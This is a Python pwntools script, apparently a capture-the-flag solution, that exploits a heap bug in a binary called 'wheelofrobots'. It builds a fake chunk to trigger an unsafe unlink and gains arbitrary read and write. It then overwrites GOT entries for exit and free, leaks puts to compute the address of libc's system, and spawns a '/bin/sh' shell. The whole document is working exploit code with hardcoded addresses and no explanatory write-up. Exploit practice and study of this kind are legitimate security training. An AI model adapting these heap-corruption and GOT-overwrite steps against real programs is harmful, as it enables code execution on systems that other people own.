from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./wheelofrobots"

bin = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

conn = process(file)
#gdb.attach(conn)

def menu(choice):
    conn.recvuntil("Start the Wheel")
    conn.recvuntil("choice :")
    conn.send(str(choice))

def a(robo_type, param=None):
    menu(1)
    conn.recvuntil("choice :")
    if type(robo_type) == type(1):
        conn.send(str(robo_type))
    else:
        conn.send(robo_type)
    if param is not None:
        conn.recvuntil("Increase")
        conn.send(str(param))

def d(robo_type):
    menu(2)
    conn.recvuntil("choice :")
    conn.send(str(robo_type))

def c(robo_type, name):
    menu(3)
    conn.recvuntil("choice :")
    conn.send(str(robo_type))
    conn.recvuntil("name: ")
    conn.send(name)

def s():
    menu(4)

# Unlink exploit - pointers in global memory

a(2, 2) # malloc(0x28)
a(3, 8) # malloc(160)
d(2) # Goes into fastbin

# malloc_consolidate -> fast chunk goes into smallbin, prev_in_use cleared
# Also set flag for robo2 as set
a("4aaaa1")

d(4)

# Now we can create a fake chunk inside robot 2

robo2_addr = 0x06030F0

payload = p64(0) + \
          p64(0x20) + \
          p64(robo2_addr - 8*3) + \
          p64(robo2_addr - 8*2) + \
          p64(0x20)
c(2, payload)

# Freeing 3rd robo -> unlink
d(3)

# robo2 now points to robo2_addr - 3*8 !

# robo4 will be used for arbitrary read and write
a(4)

def a_write(addr, value):
    # First allocate robo4
    payload = p64(0) + \
              p64(addr)
    c(2, payload)
    c(4, value)

# Preparing for a_read
# Overwrite exit's got with 'ret' gadget
# Setting robo count > 2
ret_gadget = 0x40162D
robo_count_addr = 0x603130
a_write(bin.got['exit'], p64(ret_gadget))
a_write(robo_count_addr, p64(3))

def a_read(addr):
    # Trying to read robo 4
    payload = p64(0) + \
              p64(addr)
    c(2, payload)
    data = ""
    while data == "":
        s()
        l = conn.recvline()
        if "( )" in l:
            continue # robo 2 was read
        if "/\\    ____________________________    /\\" in l:
            continue # after 4 was read
        conn.recvuntil("Thx ")
        data = conn.recvuntil("!")[:-1]
        if "(null)" in data:
            data = "" # robo 1 was read
    return data

puts_addr = u64(a_read(bin.got['puts']) + "\x00\x00")

system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr

a_write(bin.got['free'], p64(system_addr))

c(2, "/bin/sh\x00")
d(2)

conn.interactive()
